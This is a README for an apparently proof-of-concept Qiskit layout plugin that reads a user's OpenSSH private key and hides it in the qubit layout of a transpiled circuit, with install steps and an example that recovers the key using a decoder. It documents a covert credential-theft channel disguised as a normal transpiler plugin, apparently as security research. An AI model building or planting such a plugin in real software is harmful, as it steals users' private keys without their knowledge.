# qiskit-layout-attack

A transpilation layout plugin that can be used with Qiskit to leak OpenSSH private keys from the computer executing the
transpilation.

Current implementation, by default, tries to read the default OpenSSH ed25519 private key in `~/.ssh/id_ed25519`.
Alternatively, the name of the key file can be provided using the environment variable `keyname` (see 
[the example](#Example) below). If the key file does not exist, the layout plugin fallbacks to the
[`TrivialLayout`](https://docs.quantum.ibm.com/api/qiskit/qiskit.transpiler.passes.TrivialLayout), which maps  virtual
qubits to physical qubits in the trivial way (i.e., $0\rightarrow0$, $1\rightarrow1$, etc.).

The plugin [is implemented](src/qiskit_leaky_layout/leaky_layout_plugin.py#L151) as a subclass of
[`PassManagerStagePlugin`](https://docs.quantum.ibm.com/api/qiskit/qiskit.transpiler.preset_passmanagers.plugin.PassManagerStagePlugin),
which uses a custom pass called [`LeakyLayout`](src/qiskit_leaky_layout/leaky_layout_plugin.py#L83). This pass is
implemented as a subclass of [`AnalysisPass`](https://docs.quantum.ibm.com/api/qiskit/qiskit.transpiler.AnalysisPass),
since no changes to the quantum circuit are done.

Leaked data can be recovered with the `recover_data()` or `extract_key()` functions implemented in the
[decoder module](src/qiskit_leaky_layout/decoder.py). See [the example](#Example) below.

## Installation

```shell
git clone git@github.com:cryptohslu/qiskit-leaky-layout.git
cd qiskit-leaky-layout
pip install .
```

## Example

```python
import os
from pathlib import Path

from cryptography.hazmat.primitives.serialization import load_ssh_private_key
from qiskit.circuit import QuantumCircuit
from qiskit.transpiler.preset_passmanagers import generate_preset_pass_manager
from qiskit.transpiler.preset_passmanagers.plugin import list_stage_plugins
from qiskit_ibm_runtime.fake_provider import FakeBrisbane

from qiskit_leaky_layout.decoder import extract_key, recover_data

# Check that layout plugin was installed successfully
assert "leaky_layout" in list_stage_plugins("layout")

# You can generate a dummy passwordless key with this command
# ssh-keygen -t ed25519 -f ~/.ssh/leaked_key -P ""

# Set environment variable with key to be leaked
os.environ["keyname"] = "leaked_key"

# Load private key to compare later with recovered one
with open(Path.home() / ".ssh" / "leaked_key", "rb") as file:
    original_private_key = load_ssh_private_key(
        file.read(), password=None
    ).private_bytes_raw()

# Fake 127-qubit backend used as target for the transpilation
backend = FakeBrisbane()

# Pass manager for the transpilation with our custom layout plugin
pm = generate_preset_pass_manager(
    optimization_level=3, backend=backend, layout_method="leaky_layout"
)

# 3-qubit GHZ circuit
# Quantum circuit is created with 127 qubits to match the number of
# physical qubits in the targeted backend
qc = QuantumCircuit(127)
qc.h(0)
qc.cx(0, range(1, 3))

# Transpiled circuit
isa_qc = pm.run(qc)

# Recover key as raw bytes
recovered_private_key = recover_data(isa_qc, size_alphabet=127, num_bytes=32)
assert original_private_key == recovered_private_key

# Store leaked key in OpenSSH format
extract_key(isa_qc, "extracted_key", overwrite=True)
assert Path.is_file(Path.home() / ".ssh" / "extracted_key")
```
